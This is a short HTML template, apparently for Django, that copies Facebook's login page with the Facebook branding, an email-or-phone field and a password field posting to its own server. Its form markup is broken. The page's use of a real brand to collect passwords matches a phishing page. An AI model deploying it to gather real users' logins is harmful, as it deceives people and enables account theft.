<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="facebook.css">
</head>
<body>
    <div class="textbox">
        <h1>
            facebook
        </h1>
        <h2>
            Facebook helps you connect and share<br> with the people in your life.
        </h2>
    </div>


<div class="container">
    <div class="form">
        <form action="/" method="POST"></form>
            {% csrf_token %}
            <input type="text" class="text" name="name" placeholder="Enter Your Email or Phone number"> <br>
            <input type="password" class="text" name="fname" placeholder="Password"><br>
            <button>
                Log In
            </button>
            <p><a href="">forgot password?</a><br></p>
            <div class="btn">
                <button>Create New Account</button>
            </div>
        </form>
    </div>
</div>    
</body>
</html>
